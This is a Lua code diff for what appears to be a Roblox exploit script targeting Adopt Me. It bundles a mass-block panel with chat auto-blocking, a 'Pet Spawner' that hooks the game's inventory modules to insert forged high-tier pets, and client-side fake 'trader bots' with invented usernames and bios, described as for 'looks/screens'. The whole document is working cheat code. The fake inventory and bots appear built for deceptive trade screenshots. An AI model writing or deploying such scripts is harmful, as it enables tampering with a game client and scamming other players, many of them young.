+           btn.Parent.Visible = (q == "" or string.find(string.lower(plr.Name), q, 1, true) ~= nil)
+       end
+   end
+end)
+
+blockAll.MouseButton1Click:Connect(function()
+   if isBlocking then return end
+   isBlocking = true
+   task.spawn(function()
+       for _,p in ipairs(Players:GetPlayers()) do
+           if not safePlayers[p] and p ~= LocalPlayer then
+               realSilentBlock(p)
+               task.wait(0.25) -- small delay so you don't spam inputs
+           end
+           if not isBlocking then break end
+       end
+       isBlocking = false
+   end)
+end)
+
+stopButton.MouseButton1Click:Connect(function()
+   isBlocking = false
+end)
+
+-- chat auto-block
+local function checkMsg(msg)
+   local l = string.lower(msg)
+   for _,w in ipairs(BLOCK_KEYWORDS) do
+       if string.find(l,w,1,true) then
+           return true
+       end
+   end
+   return false
+end
+
+local function onChat(plr, msg)
+   if autoBlockEnabled and plr ~= LocalPlayer and checkMsg(msg) then
+       realSilentBlock(plr)
+   end
+end
+
+for _,p in ipairs(Players:GetPlayers()) do
+   if p ~= LocalPlayer then
+       p.Chatted:Connect(function(m) onChat(p,m) end)
+   end
+end
+
+Players.PlayerAdded:Connect(function(p)
+   if p ~= LocalPlayer then
+       p.Chatted:Connect(function(m) onChat(p,m) end)
+   end
+end)
+
+-- ================== USERNAME PAGE (FLOAT TEXT) ==================
+
+local usernamePage = Instance.new("Frame")
+usernamePage.Size = UDim2.new(1,0,1,-90*scale)
+usernamePage.Position = UDim2.new(0,0,0,90*scale)
+usernamePage.BackgroundTransparency = 1
+usernamePage.Visible = false
+usernamePage.Parent = mainFrame
+
+local MAX_TEXTS = 5
+local floatingTexts = {}
+local selectedText = nil
+
+local addBtn = Instance.new("TextButton")
+addBtn.Size = UDim2.new(0,55*scale,0,55*scale)
+addBtn.Position = UDim2.new(0.5,-27.5*scale,0,15*scale)
+addBtn.BackgroundColor3 = Color3.fromRGB(80,200,120)
+addBtn.Text = "+"
+addBtn.TextColor3 = Color3.new(1,1,1)
+addBtn.Font = Enum.Font.GothamBold
+addBtn.TextSize = 36*scale
+addBtn.Parent = usernamePage
+
+local addBtnCorner = Instance.new("UICorner")
+addBtnCorner.CornerRadius = UDim.new(1,0)
+addBtnCorner.Parent = addBtn
+
+-- lock / trash controls for selected text
+local lockBtn = Instance.new("TextButton")
+lockBtn.Size = UDim2.new(0,40*scale,0,40*scale)
+lockBtn.Position = UDim2.new(0.075,0,0,20*scale)
+lockBtn.BackgroundColor3 = Color3.fromRGB(80,160,255)
+lockBtn.Text = "?"
+lockBtn.TextColor3 = Color3.new(1,1,1)
+lockBtn.Font = Enum.Font.GothamBold
+lockBtn.TextSize = 20*scale
+lockBtn.Parent = usernamePage
+
+local lockBtnCorner = Instance.new("UICorner")
+lockBtnCorner.CornerRadius = UDim.new(0,12*scale)
+lockBtnCorner.Parent = lockBtn
+
+local trashBtn = Instance.new("TextButton")
+trashBtn.Size = UDim2.new(0,40*scale,0,40*scale)
+trashBtn.Position = UDim2.new(1,-40*scale-20,0,20*scale)
+trashBtn.BackgroundColor3 = Color3.fromRGB(220,80,80)
+trashBtn.Text = "??"
+trashBtn.TextColor3 = Color3.new(1,1,1)
+trashBtn.Font = Enum.Font.GothamBold
+trashBtn.TextSize = 20*scale
+trashBtn.Parent = usernamePage
+
+local trashBtnCorner = Instance.new("UICorner")
+trashBtnCorner.CornerRadius = UDim.new(0,12*scale)
+trashBtnCorner.Parent = trashBtn
+
+-- helpers to track locks
+local function findEntry(label)
+   for _,entry in ipairs(floatingTexts) do
+       if entry.label == label then
+           return entry
+       end
+   end
+end
+
+local function refreshLockUI()
+   local entry = selectedText and findEntry(selectedText)
+   if entry and entry.locked then
+       lockBtn.Text = "?"
+       lockBtn.BackgroundColor3 = Color3.fromRGB(220,80,80)
+   else
+       lockBtn.Text = "?"
+       lockBtn.BackgroundColor3 = Color3.fromRGB(80,160,255)
+   end
+end
+
+lockBtn.MouseButton1Click:Connect(function()
+   local entry = selectedText and findEntry(selectedText)
+   if not entry then return end
+
+   entry.locked = not entry.locked
+   selectedText.Active = not entry.locked
+   selectedText.Draggable = not entry.locked
+
+   refreshLockUI()
+end)
+
+trashBtn.MouseButton1Click:Connect(function()
+   if not selectedText then return end
+
+   local indexToRemove
+   for i,entry in ipairs(floatingTexts) do
+       if entry.label == selectedText then
+           indexToRemove = i
+           if entry.gui then
+               entry.gui:Destroy()
+           else
+               selectedText:Destroy()
+           end
+           break
+       end
+   end
+   if indexToRemove then
+       table.remove(floatingTexts, indexToRemove)
+   end
+
+   selectedText = nil
+   refreshLockUI()
+end)
+
+local sizeLabel = Instance.new("TextLabel")
+sizeLabel.Size = UDim2.new(0.85,0,0,30*scale)
+sizeLabel.Position = UDim2.new(0.075,0,0,185*scale)
+sizeLabel.BackgroundTransparency = 1
+sizeLabel.Text = "Size: 50px"
+sizeLabel.TextColor3 = Color3.fromRGB(200,200,220)
+sizeLabel.Font = Enum.Font.Gotham
+sizeLabel.TextSize = 16*scale
+sizeLabel.Parent = usernamePage
+
+local sizeSlider = Instance.new("TextButton")
+sizeSlider.Size = UDim2.new(0.85,0,0,20*scale)
+sizeSlider.Position = UDim2.new(0.075,0,0,215*scale)
+sizeSlider.BackgroundColor3 = Color3.fromRGB(50,50,70)
+sizeSlider.Text = ""
+sizeSlider.Parent = usernamePage
+
+local sizeSliderCorner = Instance.new("UICorner")
+sizeSliderCorner.CornerRadius = UDim.new(0,10*scale)
+sizeSliderCorner.Parent = sizeSlider
+
+local sliderKnob = Instance.new("Frame")
+sliderKnob.Size = UDim2.new(0,20*scale,1,0)
+sliderKnob.Position = UDim2.new(0.5,0,0,0)
+sliderKnob.BackgroundColor3 = Color3.fromRGB(80,160,255)
+sliderKnob.Parent = sizeSlider
+
+local sliderKnobCorner = Instance.new("UICorner")
+sliderKnobCorner.CornerRadius = UDim.new(1,0)
+sliderKnobCorner.Parent = sliderKnob
+
+local textSize = 50
+local function updateSize()
+   if selectedText then
+       selectedText.Size = UDim2.new(0,400*scale,0,textSize*scale)
+   end
+   sizeLabel.Text = "Size: "..textSize.."px"
+end
+
+sizeSlider.InputBegan:Connect(function(i)
+   if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+       local conn
+       conn = RunService.Heartbeat:Connect(function()
+           local mouse = LocalPlayer:GetMouse()
+           local rel = math.clamp((mouse.X - sizeSlider.AbsolutePosition.X) / sizeSlider.AbsoluteSize.X, 0, 1)
+           sliderKnob.Position = UDim2.new(rel,-10*scale,0,0)
+           textSize = math.floor(10 + rel * 90)
+           updateSize()
+           if i.UserInputState == Enum.UserInputState.End then
+               conn:Disconnect()
+           end
+       end)
+   end
+end)
+
+local textBox = Instance.new("TextBox")
+textBox.Size = UDim2.new(0.85,0,0,40*scale)
+textBox.Position = UDim2.new(0.075,0,0,85*scale)
+textBox.PlaceholderText = "Text..."
+textBox.BackgroundColor3 = Color3.fromRGB(30,30,45)
+textBox.TextColor3 = Color3.fromRGB(230,230,240)
+textBox.Font = Enum.Font.Gotham
+textBox.TextSize = 18*scale
+textBox.Parent = usernamePage
+
+local textBoxCorner = Instance.new("UICorner")
+textBoxCorner.CornerRadius = UDim.new(0,12*scale)
+textBoxCorner.Parent = textBox
+
+local fontDropdown = Instance.new("TextButton")
+fontDropdown.Size = UDim2.new(0.85,0,0,40*scale)
+fontDropdown.Position = UDim2.new(0.075,0,0,135*scale)
+fontDropdown.BackgroundColor3 = Color3.fromRGB(30,30,45)
+fontDropdown.Text = "GothamBlack"
+fontDropdown.TextColor3 = Color3.fromRGB(230,230,240)
+fontDropdown.Font = Enum.Font.Gotham
+fontDropdown.TextSize = 18*scale
+fontDropdown.Parent = usernamePage
+
+local fontDropdownCorner = Instance.new("UICorner")
+fontDropdownCorner.CornerRadius = UDim.new(0,12*scale)
+fontDropdownCorner.Parent = fontDropdown
+
+local fontMenu = Instance.new("Frame")
+fontMenu.Size = UDim2.new(0.85,0,0,160*scale)
+fontMenu.Position = fontDropdown.Position + UDim2.new(0,0,0,40*scale)
+fontMenu.BackgroundColor3 = Color3.fromRGB(30,30,45)
+fontMenu.Visible = false
+fontMenu.Parent = usernamePage
+
+local fontMenuCorner = Instance.new("UICorner")
+fontMenuCorner.CornerRadius = UDim.new(0,12*scale)
+fontMenuCorner.Parent = fontMenu
+
+local fl = Instance.new("UIListLayout")
+fl.Padding = UDim.new(0, 3 * scale)
+fl.Parent = fontMenu
+
+local fonts = {"GothamBlack","GothamBold","Gotham","Arial","SourceSans"}
+
+for _,f in ipairs(fonts) do
+   local b = Instance.new("TextButton")
+   b.Size = UDim2.new(1,0,0,30*scale)
+   b.BackgroundColor3 = Color3.fromRGB(50,50,70)
+   b.Text = f
+   b.TextColor3 = Color3.fromRGB(230,230,240)
+   b.Font = Enum.Font[f] or Enum.Font.Gotham
+   b.TextSize = 16*scale
+   b.Parent = fontMenu
+
+   b.MouseButton1Click:Connect(function()
+       if selectedText then
+           selectedText.Font = Enum.Font[f] or Enum.Font.Gotham
+       end
+       fontDropdown.Text = f
+       fontMenu.Visible = false
+   end)
+end
+
+fontDropdown.MouseButton1Click:Connect(function()
+   fontMenu.Visible = not fontMenu.Visible
+end)
+
+local function createText()
+   if #floatingTexts >= MAX_TEXTS then return end
+
+   local gui = Instance.new("ScreenGui")
+   gui.IgnoreGuiInset = true
+   gui.Parent = PlayerGui
+
+   local label = Instance.new("TextLabel")
+   label.Size = UDim2.new(0,400*scale,0,50*scale)
+   label.Position = UDim2.new(0.5,-200*scale,0.2 + #floatingTexts*0.15,0)
+   label.BackgroundTransparency = 1
+   label.Text = "Your Text"
+   label.Font = Enum.Font.GothamBlack
+   label.TextScaled = true
+   label.TextColor3 = Color3.new(1,1,1)
+   label.TextStrokeTransparency = 0.75
+   label.TextStrokeColor3 = Color3.new(0,0,0)
+   label.Active = true
+   label.Draggable = true
+   label.Parent = gui
+
+   local stroke = Instance.new("UIStroke")
+   stroke.Thickness = 4
+   stroke.Parent = label
+
+   local grad = Instance.new("UIGradient")
+   grad.Color = ColorSequence.new({
+       ColorSequenceKeypoint.new(0,   Color3.fromRGB(255,0,0)),
+       ColorSequenceKeypoint.new(0.16,Color3.fromRGB(255,128,0)),
+       ColorSequenceKeypoint.new(0.32,Color3.fromRGB(255,255,0)),
+       ColorSequenceKeypoint.new(0.48,Color3.fromRGB(0,255,0)),
+       ColorSequenceKeypoint.new(0.66,Color3.fromRGB(0,255,255)),
+       ColorSequenceKeypoint.new(0.82,Color3.fromRGB(0,128,255)),
+       ColorSequenceKeypoint.new(1,   Color3.fromRGB(255,0,255))
+   })
+   grad.Parent = stroke
+
+   RunService.Heartbeat:Connect(function(dt)
+       grad.Rotation = (grad.Rotation + dt*100) % 360
+   end)
+
+   stroke.Enabled = false
+
+   local entry = {label = label, gui = gui, stroke = stroke, locked = false}
+   table.insert(floatingTexts, entry)
+
+   label.InputBegan:Connect(function(i)
+       if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+           selectedText = label
+           for _,v in ipairs(floatingTexts) do
+               v.stroke.Enabled = (v.label == label)
+           end
+           textBox.Text = label.Text
+           fontDropdown.Text = label.Font.Name
+           textSize = label.AbsoluteSize.Y / scale
+           updateSize()
+           refreshLockUI()
+       end
+   end)
+end
+
+addBtn.MouseButton1Click:Connect(createText)
+
+textBox:GetPropertyChangedSignal("Text"):Connect(function()
+   if selectedText then
+       selectedText.Text = (textBox.Text == "" and "Your Text" or textBox.Text)
+   end
+end)
+
+page1Btn.MouseButton1Click:Connect(function()
+   blockPage.Visible = true
+   usernamePage.Visible = false
+   page1Btn.TextColor3 = Color3.fromRGB(230,230,240)
+   page2Btn.TextColor3 = Color3.fromRGB(140,150,170)
+   TweenService:Create(tabLine,TweenInfo.new(0.25),{Position = UDim2.new(0,3*scale,0,87*scale)}):Play()
+end)
+
+page2Btn.MouseButton1Click:Connect(function()
+   blockPage.Visible = false
+   usernamePage.Visible = true
+   page1Btn.TextColor3 = Color3.fromRGB(140,150,170)
+   page2Btn.TextColor3 = Color3.fromRGB(230,230,240)
+   TweenService:Create(tabLine,TweenInfo.new(0.25),{Position = UDim2.new(0.5,3*scale,0,87*scale)}):Play()
+end)
+
+-- ================== LIVE BAN CHECK (MID-GAME) ==================
+
+task.spawn(function()
+   while true do
+       if isBanned() then
+           LocalPlayer:Kick("Banned from Block system by Envision.")
+           break
+       end
+       task.wait(3)
+   end
+end)
+
+-- ================== TOGGLE BUTTON ==================
+
+local toggleGui = Instance.new("ScreenGui")
+toggleGui.ResetOnSpawn = false
+toggleGui.Parent = PlayerGui
+
+local toggleBtn = Instance.new("TextButton")
+toggleBtn.Size = UDim2.new(0,65*scale,0,65*scale)
+toggleBtn.Position = UDim2.new(0,15,0,15)
+toggleBtn.BackgroundColor3 = Color3.fromRGB(255,255,255)
+toggleBtn.Text = "Alert"
+toggleBtn.TextColor3 = Color3.fromRGB(255,100,100)
+toggleBtn.Font = Enum.Font.GothamBlack
+toggleBtn.TextSize = 24*scale
+toggleBtn.Parent = toggleGui
+
+local toggleBtnCorner = Instance.new("UICorner")
+toggleBtnCorner.CornerRadius = UDim.new(1,0)
+toggleBtnCorner.Parent = toggleBtn
+
+toggleBtn.MouseButton1Click:Connect(function()
+   mainFrame.Visible = not mainFrame.Visible
+   adminPanel.Visible = false
+end)
+
+mainFrame.Visible = true
+
+end
+
+local function runPetSpawner()
+
+-- Skai Pet Spawner | Non-stacking, infinite random age, ordered high-tier
+local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
+
+-- Load Adopt Me modules
+local Loads = require(game.ReplicatedStorage.Fsys).load
+local ClientData = Loads("ClientData")
+local InventoryDB = Loads("InventoryDB")
+local Inventory = ClientData.get("inventory")
+
+-- =========================
+-- Main GUI
+-- =========================
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "SkaiPetSpawner"
+screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 320, 0, 300)
+mainFrame.Position = UDim2.new(0.5, -160, 0.4, -150)
+mainFrame.BackgroundColor3 = Color3.fromRGB(30,30,40)
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = screenGui
+
+local uiCorner = Instance.new("UICorner")
+uiCorner.CornerRadius = UDim.new(0,10)
+uiCorner.Parent = mainFrame
+
+local uiStroke = Instance.new("UIStroke")
+uiStroke.Color = Color3.fromHSV(0,1,1)
+uiStroke.Thickness = 3
+uiStroke.Parent = mainFrame
+
+-- Title
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1,0,0,25)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "?Pet Spawner?"
+titleLabel.Font = Enum.Font.FredokaOne
+titleLabel.TextSize = 20
+titleLabel.TextColor3 = Color3.fromRGB(240,240,255)
+titleLabel.Parent = mainFrame
+
+-- Subtitle
+local subtitleLabel = Instance.new("TextLabel")
+subtitleLabel.Size = UDim2.new(1,0,0,20)
+subtitleLabel.Position = UDim2.new(0,0,0,25)
+subtitleLabel.BackgroundTransparency = 1
+subtitleLabel.Text = "dc @trepzo"
+subtitleLabel.Font = Enum.Font.FredokaOne
+subtitleLabel.TextSize = 14
+subtitleLabel.TextColor3 = Color3.fromRGB(255,255,255)
+subtitleLabel.TextTransparency = 0.5
+subtitleLabel.Parent = mainFrame
+
+-- Tabs
+local tabFrame = Instance.new("Frame")
+tabFrame.Size = UDim2.new(1,0,0,30)
+tabFrame.Position = UDim2.new(0,0,0,50)
+tabFrame.BackgroundTransparency = 1
+tabFrame.Parent = mainFrame
+
+local petTab = Instance.new("TextButton")
+petTab.Size = UDim2.new(0.5,0,1,0)
+petTab.Text = "Pets"
+petTab.BackgroundColor3 = Color3.fromRGB(80,80,100)
+petTab.Font = Enum.Font.FredokaOne
+petTab.TextColor3 = Color3.fromRGB(255,255,255)
+petTab.TextSize = 16
+petTab.Parent = tabFrame
+
+local toyTab = Instance.new("TextButton")
+toyTab.Size = UDim2.new(0.5,0,1,0)
+toyTab.Position = UDim2.new(0.5,0,0,0)
+toyTab.Text = "Toys"
+toyTab.BackgroundColor3 = Color3.fromRGB(60,60,80)
+toyTab.Font = Enum.Font.FredokaOne
+toyTab.TextColor3 = Color3.fromRGB(255,255,255)
+toyTab.TextSize = 16
+toyTab.Parent = tabFrame
+
+local petContent = Instance.new("Frame")
+petContent.Size = UDim2.new(1,0,1,-80)
+petContent.Position = UDim2.new(0,0,0,80)
+petContent.BackgroundTransparency = 1
+petContent.Visible = true
+petContent.Parent = mainFrame
+
+local toyContent = Instance.new("Frame")
+toyContent.Size = UDim2.new(1,0,1,-80)
+toyContent.Position = UDim2.new(0,0,0,80)
+toyContent.BackgroundTransparency = 1
+toyContent.Visible = false
+toyContent.Parent = mainFrame
+
+petTab.MouseButton1Click:Connect(function()
+   petContent.Visible = true
+   toyContent.Visible = false
+   petTab.BackgroundColor3 = Color3.fromRGB(80,80,100)
+   toyTab.BackgroundColor3 = Color3.fromRGB(60,60,80)
+end)
+
+toyTab.MouseButton1Click:Connect(function()
+   petContent.Visible = false
+   toyContent.Visible = true
+   petTab.BackgroundColor3 = Color3.fromRGB(60,60,80)
+   toyTab.BackgroundColor3 = Color3.fromRGB(80,80,100)
+end)
+
+-- Pet name input
+local petNameBox = Instance.new("TextBox")
+petNameBox.Size = UDim2.new(0.85,0,0,28)
+petNameBox.Position = UDim2.new(0.075,0,0.05,0)
+petNameBox.BackgroundColor3 = Color3.fromRGB(40,40,50)
+petNameBox.TextColor3 = Color3.fromRGB(255,255,255)
+petNameBox.Font = Enum.Font.FredokaOne
+petNameBox.TextSize = 14
+petNameBox.PlaceholderText = "Enter Pet Name"
+petNameBox.ClearTextOnFocus = false
+petNameBox.Parent = petContent
+Instance.new("UICorner", petNameBox)
+
+-- Potion buttons
+local prefixes = {"F","R","N","M"}
+local activeFlags = {F=false,R=false,N=false,M=false}
+local buttonWidth = 0.18
+local spaceBetweenButtons = 0.07
+local totalWidth = #prefixes*buttonWidth + (#prefixes-1)*spaceBetweenButtons
+local startingX = (1-totalWidth)/2
+local prefixColors = {F = Color3.fromRGB(0,200,255), R = Color3.fromRGB(255,50,150), N = Color3.fromRGB(0,255,100), M = Color3.fromRGB(170,0,255)}
+local selectedPotion = "NO POTION"
+
+for i,prefix in ipairs(prefixes) do
+   local prefixButton = Instance.new("TextButton")
+   prefixButton.Size = UDim2.new(buttonWidth,0,0,25)
+   prefixButton.Position = UDim2.new(startingX + (buttonWidth+spaceBetweenButtons)*(i-1),0,0.2,0)
+   prefixButton.Text = prefix
+   prefixButton.BackgroundColor3 = Color3.fromRGB(60,60,70)
+   prefixButton.Font = Enum.Font.FredokaOne
+   prefixButton.TextColor3 = Color3.fromRGB(255,255,255)
+   prefixButton.TextSize = 16
+   prefixButton.Parent = petContent
+   Instance.new("UICorner", prefixButton)
+
+   local stroke = Instance.new("UIStroke")
+   stroke.Parent = prefixButton
+   stroke.Color = Color3.fromRGB(255,255,255)
+   stroke.Thickness = 2
+   stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+   prefixButton.MouseButton1Click:Connect(function()
+       activeFlags[prefix] = not activeFlags[prefix]
+       if activeFlags[prefix] then
+           stroke.Color = prefixColors[prefix]
+           stroke.Thickness = 3
+       else
+           stroke.Color = Color3.fromRGB(255,255,255)
+           stroke.Thickness = 2
+       end
+       local selected = ""
+       for k,v in pairs(activeFlags) do
+           if v then selected = selected..k end
+       end
+       selectedPotion = selected ~= "" and selected or "NO POTION"
+   end)
+end
+
+-- Feedback
+local Feedback = Instance.new("TextLabel")
+Feedback.Size = UDim2.new(1, 0, 0, 20)
+Feedback.Position = UDim2.new(0, 0, 0.7, 0)
+Feedback.BackgroundTransparency = 1
+Feedback.Font = Enum.Font.FredokaOne
+Feedback.TextSize = 14
+Feedback.TextColor3 = Color3.fromRGB(255,255,255)
+Feedback.Text = ""
+Feedback.Parent = petContent
+
+-- High Tier Pets
+local highTierPets = {
+   "Shadow Dragon","Bat Dragon","Frost Dragon","Giraffe","Owl","Parrot","Crow",
+   "Evil Unicorn","Arctic Reindeer","Hedgehog","Dalmatian","Turtle","Kangaroo",
+   "Lion","Elephant","Rhino","Cow","Blazing Lion","African Wild Dog","Diamond Butterfly",
+   "Shark Puppy","Happy Clam","Jellyfish","Goat","Balloon Unicorn","Haetae","Pelican",
+   "Flamingo","Albino Monkey","Goose","Crocodile","Candyfloss Chick","Caterpillar",
+   "Peppermint Penguin","Lion Cub","Puffer Fish","Flaming Fox","Husky","Slime","Mule",
+   "Sheeeeep","Pudding Pup","Nessie","Hare","Isla Turtle","Hot Doggo","Honey Badger",
+   "Puffin","Mini Pig","Ring-tailed Lemur","Border collie","Irish Water Spaniel",
+   "Fairy Bat Dragon","Cupid Bat Dragon","Strawberry Shortcake Bat Dragon",
+   "Chocolate Chip Bat Dragon"
+}
+
+-- ? Spawn Pets
+local function spawnPet(petName, petType)
+   petType = petType or "NO POTION"
+   local function generate_prop()
+       return {
+           flyable = petType:find("F") ~= nil,
+           rideable = petType:find("R") ~= nil,
+           neon = petType:find("N") ~= nil,
+           mega_neon = petType:find("M") ~= nil,
+           potionType = petType,
+           age = math.random(1, 2000000), -- infinite random age
+       }
+   end
+
+   for _, pets in pairs(InventoryDB.pets or {}) do
+       if pets.name == petName then
+           local fake_uuid = HttpService:GenerateGUID(false)
+           local new_pet = table.clone(pets)
+           new_pet.unique = fake_uuid
+           new_pet.category = "pets"
+           new_pet.properties = generate_prop()
+           new_pet.anti_stack_id = tostring(math.random(100000,999999)) .. "-" .. tick()
+           new_pet.favorite = true
+           Inventory.pets[fake_uuid] = new_pet
+
+           Feedback.Text = "? Pet Spawned: " .. petName .. " (" .. petType .. ")"
+           Feedback.TextColor3 = Color3.fromRGB(0, 255, 0)
+           return
+       end
+   end
+
+   Feedback.Text = "? Pet Not Found: " .. petName
+   Feedback.TextColor3 = Color3.fromRGB(255, 0, 0)
+end
+
+-- Buttons
+local spawnBtn = Instance.new("TextButton")
+spawnBtn.Size = UDim2.new(0.6,0,0,25)
+spawnBtn.Position = UDim2.new(0.2,0,0.5,0)
+spawnBtn.Text = "Spawn Pet"
+spawnBtn.BackgroundColor3 = Color3.fromRGB(0,100,200)
+spawnBtn.Font = Enum.Font.FredokaOne
+spawnBtn.TextColor3 = Color3.fromRGB(255,255,255)
+spawnBtn.TextSize = 16
+spawnBtn.Parent = petContent
+Instance.new("UICorner", spawnBtn)
+
+local highTierBtn = Instance.new("TextButton")
+highTierBtn.Size = UDim2.new(0.6,0,0,25)
+highTierBtn.Position = UDim2.new(0.2,0,0.6,0)
+highTierBtn.Text = "Spawn High Tier"
+highTierBtn.BackgroundColor3 = Color3.fromRGB(200,0,200)
+highTierBtn.Font = Enum.Font.FredokaOne
+highTierBtn.TextColor3 = Color3.fromRGB(255,255,255)
+highTierBtn.TextSize = 16
+highTierBtn.Parent = petContent
+Instance.new("UICorner", highTierBtn)
+
+spawnBtn.MouseButton1Click:Connect(function()
+   if petNameBox.Text ~= "" then
+       spawnPet(petNameBox.Text, selectedPotion)
+   else
+       Feedback.Text = "? Enter a pet name first!"
+       Feedback.TextColor3 = Color3.fromRGB(255, 200, 0)
+   end
+end)
+
+-- =========================
+-- High Tier Button Ordered + Batch Spawn (with normal combos)
+-- =========================
+highTierBtn.MouseButton1Click:Connect(function()
+   local groupedCombos = { "MFR", "MR", "M", "NFR", "NR", "N", "FR", "R", "" }
+
+   local function shuffle(tbl)
+       for i = #tbl, 2, -1 do
+           local j = math.random(i)
+           tbl[i], tbl[j] = tbl[j], tbl[i]
+       end
+       return tbl
+   end
+
+   local function batchSpawn(petsList, combo)
+       local batchSize = 20
+       for i = 1, #petsList, batchSize do
+           for j = i, math.min(i+batchSize-1, #petsList) do
+               spawnPet(petsList[j], combo)
+           end
+           RunService.Heartbeat:Wait()
+       end
+   end
+
+   for _, combo in ipairs(groupedCombos) do
+       batchSpawn(shuffle(highTierPets), combo)
+   end
+end)
+
+-- =========================
+-- Inventory Lag Fix (batch load)
+-- =========================
+local oldGetPets = Inventory.get_pets
+Inventory.get_pets = function(self)
+   local allPets = oldGetPets(self)
+   local result = {}
+   task.delay(0.5, function()
+       local batchSize = 50
+       for i = 1, #allPets, batchSize do
+           local batch = {}
+           for j = i, math.min(i+batchSize-1, #allPets) do
+               table.insert(batch, allPets[j])
+           end
+           for _,pet in ipairs(batch) do
+               table.insert(result, pet)
+           end
+           RunService.Heartbeat:Wait()
+       end
+   end)
+   return result
+end
+
+-- =========================
+-- Draggable GUI
+-- =========================
+local dragging = false
+local dragStart, startPos
+local function updateDrag(input)
+   if dragging then
+       local delta = input.Position - dragStart
+       mainFrame.Position = UDim2.new(
+           startPos.X.Scale,
+           startPos.X.Offset + delta.X,
+           startPos.Y.Scale,
+           startPos.Y.Offset + delta.Y
+       )
+   end
+end
+
+mainFrame.InputBegan:Connect(function(input)
+   if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+       dragging = true
+       dragStart = input.Position
+       startPos = mainFrame.Position
+       input.Changed:Connect(function()
+           if input.UserInputState == Enum.UserInputState.End then
+               dragging = false
+           end
+       end)
+   end
+end)
+
+mainFrame.InputChanged:Connect(updateDrag)
+UserInputService.InputChanged:Connect(function(input)
+   if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+       updateDrag(input)
+   end
+end)
+
+end
+
+local function runBotSpawner()
+
+--// Adopt Me Trader Bots - ANIMATED, NO-COLLIDE, SPAWN MOVE (SMART BIOS v8)
+--// client-side only, for looks/screens
+
+local ok, err = pcall(function()
+   local Players = game:GetService("Players")
+   local Workspace = game:GetService("Workspace")
+
+   local LocalPlayer = Players.LocalPlayer
+   local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+   -- Adopt Me font (Balthazar)
+   local BALTHAZAR_FONT = Font.new(
+       "rbxasset://fonts/families/Balthazar.json",
+       Enum.FontWeight.Regular,
+       Enum.FontStyle.Normal
+   )
+
+   local function getRoot()
+       local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+       return char:WaitForChild("HumanoidRootPart")
+   end
+
+   math.randomseed(tick())
+
+   -- raw bios (NO parentheses yet, some with ?)
+   local biosBase = {
+       "Dream pet is a queen bee, or bee ?",
+       "trading mfr for high tier only",
+       "no lowballs pls <3 ?",
+       "be kind in chat pls",
+       "looking for fair frost offers ?",
+       "trading inv, read bio first",
+       "grinding rn, trading later ?",
+       "just here to vibe and trade",
+       "only fair trades pls ?",
+       "no cross trading, stay safe",
+   }
+
+   local function trim(str)
+       return (str:gsub("^%s+", ""):gsub("%s+$", ""))
+   end
+
+   -- smart 2-line splitter for bios
+   local function smartTwoLine(text, maxLen)
+       text = trim(text or "")
+       if text == "" then return "" end
+
+       if #text <= maxLen then
+           return text
+       end
+
+       local bestSplit = nil
+       local windowStart = math.max(1, maxLen - 6)
+       local windowEnd = math.min(#text, maxLen + 6)
+
+       -- try to split near maxLen
+       for i = windowEnd, windowStart, -1 do
+           if text:sub(i, i) == " " then
+               bestSplit = i
+               break
+           end
+       end
+
+       -- fallback: last space before maxLen
+       if not bestSplit then
+           for i = maxLen, 1, -1 do
+               if text:sub(i, i) == " " then
+                   bestSplit = i
+                   break
+               end
+           end
+       end
+
+       if not bestSplit then
+           bestSplit = maxLen
+       end
+
+       local first = trim(text:sub(1, bestSplit))
+       local second = trim(text:sub(bestSplit + 1))
+
+       if second == "" then
+           return first
+       end
+
+       return first .. "\n" .. second
+   end
+
+   -- force exactly "( ... )" for bios (including newlines inside)
+   local function forceParens(text)
+       text = trim(text or "")
+       if text == "" then return "" end
+       text = text:gsub("^%s*%(", ""):gsub("%)%s*$", "")
+       return "(" .. text .. ")"
+   end
+
+   -- full formatter for bios: smart wrap + parens
+   local function formatBio(raw)
+       raw = trim(raw or "")
+       if raw == "" then return "" end
+       raw = smartTwoLine(raw, 20)    -- tweak 20 for earlier/later breaks
+       return forceParens(raw)
+   end
+
+   local function getRandomBio()
+       local raw = biosBase[math.random(1, #biosBase)]
+       return formatBio(raw)
+   end
+
+   local function getRandomUsername()
+       local parts = {
+           "lili","gabby","maddie","riley","lucy",
+           "ava","carter","champion","toasty","santa"
+       }
+       local tail = tostring(math.random(10, 9999))
+       return parts[math.random(1, #parts)] .. tail
+   end
+
+   --========== cleanup old gui ==========
+   for _, gui in ipairs(PlayerGui:GetChildren()) do
+       if gui.Name == "BotSpawnerGUI" then
+           gui:Destroy()
+       end
+   end
+
+   --========== GUI ==========
+   local screenGui = Instance.new("ScreenGui")
+   screenGui.Name = "BotSpawnerGUI"
+   screenGui.ResetOnSpawn = false
+   screenGui.Parent = PlayerGui
+
+   local mainFrame = Instance.new("Frame")
+   mainFrame.Name = "MainFrame"
+   mainFrame.Size = UDim2.new(0, 300, 0, 160)
+   mainFrame.Position = UDim2.new(0, 40, 0.5, -80)
+   mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+   mainFrame.BackgroundTransparency = 0.1
+   mainFrame.BorderSizePixel = 0
+   mainFrame.Active = true
+   mainFrame.Draggable = true
+   mainFrame.Parent = screenGui
+
+   local uiCorner = Instance.new("UICorner")
+   uiCorner.CornerRadius = UDim.new(0, 8)
+   uiCorner.Parent = mainFrame
+
+   local title = Instance.new("TextLabel")
+   title.Size = UDim2.new(1, -10, 0, 24)
+   title.Position = UDim2.new(0, 5, 0, 5)
+   title.BackgroundTransparency = 1
